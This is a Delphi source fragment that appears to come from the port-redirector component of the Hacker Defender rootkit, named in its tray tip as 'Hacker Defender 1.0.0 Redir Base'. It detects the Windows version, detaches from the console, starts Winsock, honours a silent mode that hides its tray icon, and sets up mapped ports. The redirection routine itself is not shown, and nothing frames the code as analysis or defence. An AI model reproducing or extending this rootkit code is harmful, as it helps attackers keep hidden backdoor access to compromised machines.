function GetWindowsVersion:TWindowsVersion;
var
 VerInfo:TOSVersionInfo;
begin
 VerInfo.dwOSVersionInfoSize:=SizeOf(TOSVersionInfo);
 GetVersionEx(VerInfo);
 if VerInfo.dwMajorVersion>=5 then
 begin
  if VerInfo.dwMinorVersion>=1 then Result:=wvWindowsXP
  else Result:=wvWindows2000;
 end else
 begin
  if VerInfo.dwMajorVersion>3 then
  begin
   if VerInfo.dwPlatformId=VER_PLATFORM_WIN32_NT then Result:=wvWindowsNT40
   else begin
    VerInfo.dwBuildNumber:=VerInfo.dwBuildNumber and $FFFF;
    if VerInfo.dwMinorVersion>=90 then Result:=wvWindowsMe
    else begin
     if VerInfo.dwMinorVersion>=10 then
     begin
      if VerInfo.dwBuildNumber>=2222 then Result:=wvWindows98SE
      else Result:=wvWindows98;
     end else
     begin
      if VerInfo.dwBuildNumber>=1000 then Result:=wvWindows95OSR2
      else Result:=wvWindows95;
     end;
    end;
   end;
  end else Result:=wvWin32s;
 end;
end;


begin
 WindowsVersion:=GetWindowsVersion;
 case WindowsVersion of
  wvWin32s:WindowsType:=wtWin32s;
  wvWindowsNT40,wvWindows2000,wvWindowsXP:WindowsType:=wtNT;
  wvWindows95,wvWindows95OSR2,wvWindows98,wvWindows98SE,wvWindowsMe:WindowsType:=wtWxx;
 end;
 if WindowsType=wtNT then IsConsole:=not FreeConsole
 else IsConsole:=True;

 WSAStartup(WINSOCK_VERSION,WSAData);
 AppRun:=True;
 MappedPorts:=nil;
 StartupList:=nil;
// IsConsole:=False;
 ReadThreadExists:=False;
 ReadThreadSuspened:=False;
 FirstCoords.X:=80;
 FirstCoords.Y:=25;
 SecondCoords.X:=0;
 SecondCoords.Y:=0;
 with FirstRect do
 begin
  Left:=0;
  Top:=0;
  Right:=79;
  Bottom:=24;
 end;

 IniLoaded:=LoadIniFile;
 if not CreateWin then Exit;
 if WindowsType=wtNT then
 begin
  if not SilentNow then
  begin
   Icon:=LoadIcon(HInstance,'MAINICON');
   NotifyIconData.cbSize:=SizeOf(NotifyIconData);
   NotifyIconData.Wnd:=WindowHandle;
   NotifyIconData.uID:=0;
   NotifyIconData.uFlags:=NIF_ICON or NIF_MESSAGE or NIF_TIP;
   NotifyIconData.hIcon:=Icon;
   NotifyIconData.uCallbackMessage:=WM_TRAYNOTIFY;
   NotifyIconData.szTip:='Hacker Defender 1.0.0 Redir Base';
   Shell_NotifyIcon(NIM_ADD,@NotifyIconData);
  end;
 end;
 CreateMappedPorts;
 while GetMessage(Msg,WindowHandle,1,WM_MAX) do
  if Msg.message=WM_TRAY_END then
  begin
   AppEnd;
   Break;
  end else WindowProc(Msg.hwnd,Msg.message,Msg.wParam,Msg.lParam);
 WSACleanup;
end.
